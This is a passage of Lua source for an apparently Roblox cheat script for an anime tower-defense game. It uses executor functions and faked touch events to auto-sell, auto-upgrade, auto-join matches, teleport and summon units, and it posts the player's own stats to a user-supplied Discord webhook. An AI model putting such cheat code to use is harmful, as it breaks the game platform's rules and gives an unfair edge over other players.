            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Five.Unit.Value and v.Owner.Value == me and _G.unit5 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Six.Unit.Value and v.Owner.Value == me and _G.unit6 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    end
end
end
end

workspace.Enemies.ChildAdded:Connect(function(child)
if _G.SettingsTable.deleteenemy then
child:WaitForChild("Head")
child:WaitForChild("HumanoidRootPart")
child:WaitForChild("Torso")
child.Head.Transparency = 1
child.HumanoidRootPart.Transparency = 0
local partA = child.HumanoidRootPart
local partB = child.Head
local weld = Instance.new("WeldConstraint")
weld.Parent = child
weld.Part0 = partA
weld.Part1 = partB
for _, v in pairs(child:GetChildren()) do
    if v.ClassName == "MeshPart" then v:Destroy() end
end
wait(1)
for _, v in pairs(child:GetChildren()) do
    if v.ClassName == "Folder" then v:Destroy() end
end
end
end)

function mousetp()
    pcall(function()
    local hum1 = me.Character.HumanoidRootPart
    if _G.mousetp then
        hum1.CFrame = CFrame.new(mouse1.Hit.x, mouse1.Hit.y + 5, mouse1.Hit.z)
    end
    end)
end

function autosell()
    SaveSettings()
    if _G.SettingsTable.autosell then
        SaveSettings()
        coroutine.resume(coroutine.create(function()
        pcall(function()
        repeat wait() until game:GetService("ReplicatedStorage"):WaitForChild("WaveValue").Value >= tonumber(_G.SettingsTable.autosellwave)
        end)
        checkautosell = true
        repeat wait()
        for _, v in pairs(game.Workspace.Unit:GetChildren()) do
            pcall(function()
            if v.Owner.Value == game.Players.LocalPlayer then
                wait(_G.SettingsTable.autosellspeed)
                remote:FireServer("Sell", v)
            end
            end)
        end
        until false or _G.SettingsTable.autosell == false 
        checkautosell = false
        end))
end
end

function autoupgrade()
    SaveSettings()
    if _G.SettingsTable.autoupgrade then
        SaveSettings()
            pcall(function()
                coroutine.resume(coroutine.create(function()
                repeat wait() until game:GetService("ReplicatedStorage"):WaitForChild("WaveValue").Value >= tonumber(_G.SettingsTable.autoupgradewave)
                repeat wait()
                for _, v in pairs(game.Workspace.Unit:GetChildren()) do
                pcall(function()
                if v.Owner.Value == game.Players.LocalPlayer and v.UpgradeTag.Value < v.MaxUpgradeTag.Value then
                wait()
                game.ReplicatedStorage.Remotes.Server:InvokeServer("Upgrade", v)
                end
                end)
        end
        until false or _G.SettingsTable.autoupgrade == false or checkautosell
        end))
        end)
end
end

function autojoin()
SaveSettings()
if _G.SettingsTable.autojoin then
SaveSettings()
coroutine.resume(coroutine.create(function()
while not game:IsLoaded() do
    wait(15)
end
if game.PlaceId ~= 11886211138 then
if _G.SettingsTable.mode == "Infinite Mode" then
    if _G.SettingsTable.inflevel == "Regular One Piece" then
        pcall(function()
            autojoinmap = "-1"
        end)
    end
    if _G.SettingsTable.inflevel == "Regular Food" then
        pcall(function()
            autojoinmap = "-1.7"
        end)
    end
    if _G.SettingsTable.inflevel == "Category" then
        pcall(function()
            autojoinmap = "-1.1"
        end)
    end
    if _G.SettingsTable.inflevel == "Air" then
        pcall(function()
            autojoinmap = "-1.3"
        end)
    end
    if _G.SettingsTable.inflevel == "Double Path" then
        pcall(function()
            autojoinmap = "-1.5"
        end)
    end
    if _G.SettingsTable.inflevel == "Training Mode" then
        pcall(function()
            if game:GetService("Workspace").Queue["Lobby World 2"] then
                autojoinmap = "-98"
            end
        end)
    end
    pcall(function()
        autojoinstart = "InfiniteModeStart"
        autojoinmode = "InfiniteModeInfLevel"
    end)
    local a3 = pcall(function()
        if game:GetService("Workspace").Queue["Lobby World 2"] then
            autojoinpath = game:GetService("Workspace").Queue.Joinables.InfiniteMode
        end
    end)
    if a3 == false then
        pcall(function()
            autojoinpath = game:GetService("Workspace").Queue.Infinite.InfiniteMode
        end)
    end
end
if _G.SettingsTable.mode == "Story Mode" then
    autojoinmap = _G.SettingsTable.storylevel
    local a1 = pcall(function()
        if game:GetService("Workspace").Queue["Lobby World 2"] then
            autojoinstart = "StoryModeStart"
            autojoinmode = "StoryModeLevel"
            autojoinpath = game:GetService("Workspace").Queue.Joinables.StoryMode
        end
    end)
    if a1 == false then
        autojoinstart = "Part1Start"
        autojoinmode = "Part1Level"
        autojoinpath = game:GetService("Workspace").Queue.Story.Part1
    end
end
else
    if _G.SettingsTable.mode == "Story Mode" then
        autojoinmap = _G.SettingsTable.W3storylevel
        autojoinstart = "StoryModeStart"
        autojoinmode = "StoryModeLevelW3"
        autojoinpath = game:GetService("Workspace").Queue.Joinables.StoryMode
    end
    if _G.SettingsTable.mode == "Infinite Mode" then
        autojoinmap = _G.SettingsTable.W3storylevel
        autojoinstart = "StoryModeStart"
        autojoinmode = "StoryModeInfLevelW3"
        autojoinpath = game:GetService("Workspace").Queue.Joinables.StoryMode
    end
end

pcall(function()
if _G.SettingsTable.mode ~= 'Orb Farm' and _G.SettingsTable.mode ~= 'Time Chamber' then
local maxinv = false
local Event = game:GetService("ReplicatedStorage").Remotes.Input
while game:GetService("ReplicatedStorage").Lobby.Value == true do wait()
    if autojoinpath.SurfaceGui.Frame.TextLabel.Text == "Empty" then
        local x = 0
        repeat wait()
        if maxinv == false then
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, autojoinpath, 0)
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, autojoinpath, 1)
        end
        wait(1)
        pcall(function()
        if game:GetService("Players").LocalPlayer.PlayerGui.Notification.Notification.NotificationTemplate.Label.Text == 'Your inventory is full' then
            maxinv = true
        end
        end)
        if _G.SettingsTable.tctoggle == false and maxinv then
            pcall(function()
            dothethingy = http_request or request or HttpPost or syn.request
                dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                ["embeds"] = {{["title"] = "**Full Inv**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da)}}}), 
                Method = "POST", Headers = {
                ["content-type"] = "application/json"}})
            end)
            break
        end
        pcall(function()
            if _G.SettingsTable.tctoggle and maxinv then
                if x == 0 then
                pcall(function()
                dothethingy = http_request or request or HttpPost or syn.request
                dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                ["embeds"] = {{["title"] = "**Full Inv**",
                ["description"] = "**Joining tc...**",
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da)}}}), 
                Method = "POST", Headers = {
                ["content-type"] = "application/json"}})
                end)
                end
                x = x + 1
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 0)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 1)
            end
        end)
        until autojoinpath.SurfaceGui.Frame.TextLabel.Text ~= "Empty" or _G.SettingsTable.autojoin == false
        if maxinv == false then
        coroutine.resume(coroutine.create(function()
        repeat wait()
        Event:FireServer(autojoinmode, autojoinmap, false)
        wait(.5)
        Event:FireServer(autojoinstart)
        wait(.5)
        until _G.SettingsTable.autojoin == false
        end))
        local x = 0
        if _G.SettingsTable.autojoin and autojoinpath.SurfaceGui.Frame.TextLabel.Text ~= "Empty" then
        repeat wait(1) x = x + 1 until x == 60 or _G.SettingsTable.autojoin == false
        if _G.SettingsTable.autojoin then
        game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
        end
        end
        end
        wait(1)
        break
    end
end
end
end)
end))
end
end

function autofv()
SaveSettings()
if _G.SettingsTable.autofv then
    SaveSettings()
coroutine.resume(coroutine.create(function()
pcall(function()
repeat wait()
for i,v in pairs(game:GetService("Workspace").BasePart:GetTouchingParts()) do
    if v.Parent.Parent.Name == "Enemies" then
        for _, v in pairs(game.Workspace.Unit:GetChildren()) do
            if v.Name == "Funny Valentine" and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value and v.SpecialMove["Special_Enabled2"].Value == false then
                repeat wait() remote:FireServer("UseSpecialMove", v) until v.SpecialMove["Special_Enabled2"].Value
            end
        end
    end
end
until false or _G.SettingsTable.autofv == false
end)
end))
coroutine.resume(coroutine.create(function()
pcall(function()
repeat wait()
for i,v in pairs(game:GetService("Workspace").BasePart1:GetTouchingParts()) do
    if v.Parent.Parent.Name == "Enemies" then
basesize = v.Parent.SpeedValue.Value
if game:GetService("ReplicatedStorage").SpeedUP.Value == 1 then
game:GetService("Workspace").BasePart.Size = Vector3.new(basesize/2 + 4, 10, basesize/2 + 4)
end
if game:GetService("ReplicatedStorage").SpeedUP.Value == 2 then
game:GetService("Workspace").BasePart.Size = Vector3.new(basesize + 6, 10, basesize + 6)
end
    end
end
until false or _G.SettingsTable.autofv == false
end)
end))
end
end

function autocooler()
    SaveSettings()
    if _G.SettingsTable.autocooler then
        SaveSettings()
        coroutine.resume(coroutine.create(function()
        repeat wait()
        for _, v in pairs(unit:GetChildren()) do
            pcall(function()
                if v.Name == 'Metal Cooler' and v:WaitForChild('Owner').Value == me and v:WaitForChild('UpgradeTag').Value == v.MaxUpgradeTag.Value and v.SpecialMove["Special_Enabled2"].Value == false then
                    repeat wait() remote:FireServer("UseSpecialMove", v) until v.SpecialMove["Special_Enabled2"].Value
                end
            end)
        end
        until _G.SettingsTable.autocooler == false
        end))
    end
end
--Values

_G.autobrook = false
_G.autoerwin = false
_G.autogojo = false
_G.lawupgrade = false
_G.mobnotifacation = false
_G.lawability = false
_G.yugiability = false
_G.playback = false
_G.record = false
_G.autoextreme = false
_G.autoreplay = false
_G.auto2x = false
_G.autoexecute = false

--Tabs

local BuffTab = Window:MakeTab({
	Name = "Auto Support",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local UpgradeTab = Window:MakeTab({
	Name = "Auto Upgrade",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local AbilityTab = Window:MakeTab({
	Name = "Auto Ability",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local PriorityTab = Window:MakeTab({
	Name = "Auto Priority",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local LobbyTab = Window:MakeTab({
	Name = "Lobby Stuff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MobCounterTab = Window:MakeTab({
	Name = "Mob Count",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MacroTab = Window:MakeTab({
	Name = "Macro",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local SettingsTab = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local WhTab = Window:MakeTab({
	Name = "Webhook",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
--Toggles:

-- WhTab

WhTab:AddTextbox({
	Name = "Webhook URL",
	Default = _G.SettingsTable.WhURL,
	TextDisappear = true,
	Increment = 1,
	Callback = function(Value)
	    if Value ~= "" then
	    _G.SettingsTable.WhURL = Value
	    SaveSettings()
	    OrionLib:MakeNotification({
            Name = "URL",
            Content = "Saved",
            Time = 3
        })
        end
	end    
})

WhTab:AddButton({
	Name = "Test webhook URL",
	Default = false,
	Callback = function(Value)
	    pcall(function()
dothethingy = http_request or request or HttpPost or syn.request
dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "**Bob Webhook**",
["description"] = "Test",
["type"] = "rich",
["color"] = tonumber(0x7269da)}}}), 
Method = "POST", Headers = {
["content-type"] = "application/json"}})
        end)
	end    
})

WhTab:AddToggle({
	Name = "Send webhook when match starts and ends",
	Default = _G.SettingsTable.Webhook,
	Callback = function(Value)
	    _G.SettingsTable.Webhook = Value
        SaveSettings()
        if _G.SettingsTable.Webhook and game:GetService("ReplicatedStorage").Lobby.Value == false then
        coroutine.resume(coroutine.create(function()
        pcall(function()
        game.Workspace.Camera:WaitForChild(game.Players.LocalPlayer.Name)
        wait(1)
	    pcall(function()
        plrlevel = game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame").TextLabel.Text
        end)
	    dothethingy = http_request or request or HttpPost or syn.request
        dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"] = {{["title"] = "**Bob Webhook**",
        ["description"] = "**Match Started**" .. "\n" .. "**Map:** " .. game:GetService("ReplicatedStorage").Map.Value .. "\n" .. "**Username:** " .. game.Players.LocalPlayer.Name .. "\n" .. "**Level:** " .. string.sub(plrlevel, 4) .. "\n" .. "**XP Left:** " .. game:GetService("Players").LocalPlayer.PlayerGui.HUD.Others.XpBar.XP.Text .. "\n" ..  "**Gold Amount: **" .. game:GetService("Players").LocalPlayer.PlayerGui.HUD.Summon.Gems.Balance.GoldAmount.Text .. "\n" .. "**Gem Amount:** " .. game:GetService("Players").LocalPlayer.PlayerGui.HUD.Summon.Gems.Balance.Amount.Text,
        ["type"] = "rich",
        ["color"] = tonumber(0x7269da)}}}), 
        Method = "POST", Headers = {
        ["content-type"] = "application/json"}})
        repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Wave.Visible
        repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Wave.Visible == false
        if game:GetService("Workspace").TowerHP.HP.Value > 0 then
dothethingy = http_request or request or HttpPost or syn.request
dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "**Bob Webhook**",
["description"] = "**Match Ended**" .. "\n" .. "**Status: WIN**" .. "\n" .. "**Map:** " .. game:GetService("ReplicatedStorage").Map.Value .. "\n" .. "**Username:** " .. game.Players.LocalPlayer.Name .. "\n" .. "**Time Elapsed (Macro Timer)**" .. "\n" .. timer .. " Seconds",
["type"] = "rich",
["color"] = tonumber(0x7269da)}}}), 
Method = "POST", Headers = {
["content-type"] = "application/json"}})
else
dothethingy = http_request or request or HttpPost or syn.request
dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "**Bob Webhook**",
["description"] = "**Match Ended**" .. "\n" .. "**Status: LOST**" .. "\n" .. "**Lost Wave:** " .. game:GetService("ReplicatedStorage").WaveValue.Value .. "\n" .. "**Map:** " .. game:GetService("ReplicatedStorage").Map.Value .. "\n" .. "**Username:** " .. game.Players.LocalPlayer.Name .. "\n" .. "**Time Elapsed (Macro Timer)**" .. "\n" .. timer .. " Seconds",
["type"] = "rich",
["color"] = tonumber(0x7269da)}}}), 
Method = "POST", Headers = {
["content-type"] = "application/json"}})
end
end)
end))
end
end    
})


LobbyTab:AddToggle({
	Name = "Auto TP W2",
	Default = _G.SettingsTable.forcetpw2,
	Callback = function(Value)
        _G.SettingsTable.forcetpw2 = Value
        SaveSettings()
        if _G.SettingsTable.forcetpw2 then
            pcall(function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.World2, 0)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.World2, 1)
            end)
            pcall(function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.Teleporter, 0)
            end)
        end
	end    
})

LobbyTab:AddToggle({
	Name = "Auto TP W3",
	Default = _G.SettingsTable.autotpw3,
	Callback = function(Value)
        _G.SettingsTable.autotpw3 = Value
        SaveSettings()
        if _G.SettingsTable.autotpw3 then
            pcall(function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue["Lobby World 2"].Walkway["W3Temp [DELETED AT RUNTIME]"].Gate.ToriiGate.Teleporter, 0)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue["Lobby World 2"].Walkway["W3Temp [DELETED AT RUNTIME]"].Gate.ToriiGate.Teleporter, 1)
            end)
            pcall(function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World3PortalArea.Gate.ToriiGate.Teleporter, 0)
            end)
        end
	end    
})

LobbyTab:AddButton({
    Name = "Teleport World 1",
    Default = false,
    Callback = function(Value)
        pcall(function()
            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World1.World1, 0)
        end)
	    pcall(function()
	        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World1.Teleporter, 0)
	    end)
    end    
})

LobbyTab:AddButton({
    Name = "Teleport World 2",
    Default = false,
    Callback = function(Value)
        pcall(function()
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.World2, 0)
        end)
	    pcall(function()
	        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.Teleporter, 0)
	    end)
    end    
})

LobbyTab:AddButton({
	Name = "Force World 3 TP ",
	Default = false,
	Callback = function(Value)
	    pcall(function()
        game:GetService("TeleportService"):Teleport(11886211138, LocalPlayer)
        end)
	end    
})

LobbyTab:AddDropdown({
    Name = "Banner",
    Default = "Banner X",
    Options = {"Banner W(W3)", "Banner X", "Banner Y", "Banner Z", "Gold Banner", "Special Banner Gohan", "Special Banner Diavolo", "Special Banner Ichigo", "Special Banner Katakuri"},
    Callback = function(Value)
    summonvalue = Value
    end
})

LobbyTab:AddButton({
	Name = "Summon 1x",
	Default = false,
	Callback = function(Value)
	    if summonvalue == "Banner W(W3)" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", "Water")
	    end
	    if summonvalue == "Banner X" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 1)
	    end
	    if summonvalue == "Banner Y" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 2)
	    end
	    if summonvalue == "Banner Z" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 3)
	    end
	    if summonvalue == "Gold Banner" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("GoldSummonStart")
	    end
	    if summonvalue == "Special Banner Gohan" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "GohanBeast")
	    end
	    if summonvalue == "Special Banner Diavolo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "DiavoloBanner")
	    end
	    if summonvalue == "Special Banner Ichigo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "IchigoEraser")
	    end
	    if summonvalue == "Special Banner Katakuri" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "AndroidKatakuri")
	    end
	end    
})

LobbyTab:AddButton({
	Name = "Summon 10x",
	Default = false,
	Callback = function(Value)
        if summonvalue == "Banner W(W3)" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", "Water")
	    end
        if summonvalue == "Banner X" then
            game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 1)
	    end
	    if summonvalue == "Banner Y" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 2)
	    end
	    if summonvalue == "Banner Z" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 3)
	    end
	    if summonvalue == "Gold Banner" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("GoldSummonStart10")
	    end
	    if summonvalue == "Special Banner Gohan" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "GohanBeast")
	    end
	    if summonvalue == "Special Banner Diavolo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "DiavoloBanner")
	    end
	    if summonvalue == "Special Banner Ichigo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "IchigoEraser")
	    end
	    if summonvalue == "Special Banner Katakuri" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "AndroidKatakuri")
	    end
	end    
})

LobbyTab:AddToggle({
	Name = "Auto Join",
	Default = _G.SettingsTable.autojoin,
	Callback = function(Value)
	    _G.SettingsTable.autojoin = Value
	    coroutine.resume(coroutine.create(function()
            if _G.SettingsTable.mode == 'Time Chamber' and Value and game:GetService("ReplicatedStorage").Lobby.Value then
                repeat task.wait()
                    pcall(function()
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 0)
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 1)
                    end)
                    task.wait(.5)
                until Value == false
            end
            if _G.SettingsTable.mode == 'Orb Farm' and Value and game:GetService("ReplicatedStorage").Lobby.Value then
            local x = 0
            local maxinv = false
            local a1 = pcall(function()
            repeat wait()
            if maxinv == false and game:GetService("Workspace").Queue.Joinables.Farm.SurfaceGui.TextLabel.Text == 'Empty' or game:GetService("Workspace").Queue.Joinables.Farm.SurfaceGui.TextLabel.Text:find('%d+', 22) == nil then 
                wait(5)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Joinables.Farm, 0)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Joinables.Farm, 1)
                checkorbfarm = true
                wait(1)
                pcall(function()
                    if game:GetService("Players").LocalPlayer.PlayerGui.Notification.Notification.NotificationTemplate.Label.Text == 'Your inventory is full' then
                        maxinv = true
                    end
                end)
                if _G.SettingsTable.tctoggle == false and maxinv then
                    pcall(function()
                        dothethingy = http_request or request or HttpPost or syn.request
                        dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                        ["embeds"] = {{["title"] = "**Full Inv**",
                        ["description"] = "",
                        ["type"] = "rich",
                        ["color"] = tonumber(0x7269da)}}}), 
                        Method = "POST", Headers = {
                        ["content-type"] = "application/json"}})
                    end)
                end
                pcall(function()
                    if _G.SettingsTable.tctoggle and maxinv then
                        if x == 0 then
                        pcall(function()
                        dothethingy = http_request or request or HttpPost or syn.request
                        dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                        ["embeds"] = {{["title"] = "**Full Inv**",
                        ["description"] = "**Joining tc...**",
                        ["type"] = "rich",
                        ["color"] = tonumber(0x7269da)}}}), 
                        Method = "POST", Headers = {
                        ["content-type"] = "application/json"}})
                        end)
                        end
                        x = x + 1
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 0)
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 1)
                    end
                end)
            end
            if checkorbfarm then
                repeat wait() until game:GetService("Workspace").Queue.Joinables.Farm.SurfaceGui.TextLabel.Text:sub(22) == '1' or _G.SettingsTable.autojoin == false or checkorbfarm == false
                if checkorbfarm and _G.SettingsTable.autojoin then
                    local x = 0
                    repeat wait(1) x = x + 1 until x == 30 or _G.SettingsTable.autojoin == false
                    if _G.SettingsTable.autojoin then
                        game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
                    end
                end
            end
            until _G.SettingsTable.autojoin == false
            end)
            if a1 == false then
            repeat wait()
            if maxinv == false and game:GetService("Workspace").Queue.Farm.Collisions.Part9.SurfaceGui.TextLabel.Text == 'Empty' or game:GetService("Workspace").Queue.Farm.Collisions.Part9.SurfaceGui.TextLabel.Text:find('%d+', 22) == nil then 
                wait(5)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Farm.Collisions.Part9, 0)
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Farm.Collisions.Part9, 1)
                checkorbfarm = true
                wait(1)
                pcall(function()
                    if game:GetService("Players").LocalPlayer.PlayerGui.Notification.Notification.NotificationTemplate.Label.Text == 'Your inventory is full' then
                        maxinv = true
                    end
                end)
                if _G.SettingsTable.tctoggle == false and maxinv then
                    pcall(function()
                        dothethingy = http_request or request or HttpPost or syn.request
                        dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                        ["embeds"] = {{["title"] = "**Full Inv**",
                        ["description"] = "",
                        ["type"] = "rich",
                        ["color"] = tonumber(0x7269da)}}}), 
                        Method = "POST", Headers = {
                        ["content-type"] = "application/json"}})
                    end)
                end
                pcall(function()
                    if _G.SettingsTable.tctoggle and maxinv then
                        if x == 0 then
                        pcall(function()
                        dothethingy = http_request or request or HttpPost or syn.request
                        dothethingy({Url = _G.SettingsTable.WhURL, Body = game:GetService("HttpService"):JSONEncode({
                        ["embeds"] = {{["title"] = "**Full Inv**",
                        ["description"] = "**Joining tc...**",
                        ["type"] = "rich",
                        ["color"] = tonumber(0x7269da)}}}), 
                        Method = "POST", Headers = {
                        ["content-type"] = "application/json"}})
                        end)
                        end
                        x = x + 1
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 0)
                       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.Interactions.Elevator, 1)
                    end
                end)
            end
            if checkorbfarm then
                repeat wait() until game:GetService("Workspace").Queue.Farm.Collisions.Part9.SurfaceGui.TextLabel.Text:sub(22) == '1' or _G.SettingsTable.autojoin == false or checkorbfarm == false
                if checkorbfarm and _G.SettingsTable.autojoin then
                    local x = 0
                    repeat wait(1) x = x + 1 until x == 30 or _G.SettingsTable.autojoin == false
                    if _G.SettingsTable.autojoin then
                        game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
                    end
                end
            end
            until _G.SettingsTable.autojoin == false
            end
        else
        checkorbfarm = false
        end
        end))
        autojoin()
	end
})

LobbyTab:AddToggle({
	Name = "Join time chamber if inv is full",
	Default = _G.SettingsTable.tctoggle,
	Callback = function(Value)
	    _G.SettingsTable.tctoggle = Value
	    SaveSettings()
	end
})

LobbyTab:AddToggle({
	Name = "Leave orb farm if someone joins",
	Default = _G.SettingsTable.leavevalue,
	Callback = function(Value)
	    _G.SettingsTable.leavevalue = Value
	    SaveSettings()
	    if Value then
	        FarmLeave = "FarmLeave"
	        FarmLeave2 = "Part9Leave"
	    else
	        FarmLeave = ""
	        FarmLeave2 = ""
	    end
	end
})

LobbyTab:AddDropdown({
    Name = "Auto Join Mode",
    Default = _G.SettingsTable.mode,
    Options = {"Story Mode", "Infinite Mode", 'Orb Farm', 'Time Chamber'},
    Callback = function(Value)
        _G.SettingsTable.mode = Value
        SaveSettings()
    end
})
LobbyTab:AddTextbox({
    Name = "Story/Infinite Mode Level W3: 1-6",
	Default = _G.SettingsTable.W3storylevel,
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.W3storylevel = Value
	    SaveSettings()
	end    
})

LobbyTab:AddTextbox({
	Name = "Story Mode Level W1: 1-126 W2: 127-192",
	Default = _G.SettingsTable.storylevel,
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.storylevel = Value
	    SaveSettings()
	end    
})

LobbyTab:AddDropdown({
    Name = "Infinite Mode Map",
    Default = _G.SettingsTable.inflevel,
    Options = {"Regular One Piece", "Regular Food", "Category", "Air", "Double Path", "Training Mode"},
    Callback = function(Value)
        _G.SettingsTable.inflevel = Value
        SaveSettings()
    end
})



-- PriorityTab

PriorityTab:AddToggle({
	Name = "Change Priority",
	Default = false,
	Callback = function(Value)
	    _G.priority = Value
        priority()
	end    
})

PriorityTab:AddDropdown({
	Name = "Priority",
	Default = "",
	Options = {"First", "Last", "Strongest", "Weakest", "Farthest", "Closest", "Find-Air"},
	Callback = function(Value)
		if Value == "First" then priorityvalue = 0 
		elseif Value == "Last" then priorityvalue = 1
		elseif Value == "Strongest" then priorityvalue = 2
		elseif Value == "Weakest" then priorityvalue = 3
		elseif Value == "Farthest" then priorityvalue = 4
		elseif Value == "Closest" then priorityvalue = 5
		elseif Value == "Find-Air" then priorityvalue = 6
        end
	end    
})

PriorityTab:AddToggle({
    Name = "Slot 1: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.One.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit1 = Value
    end
})

PriorityTab:AddToggle({
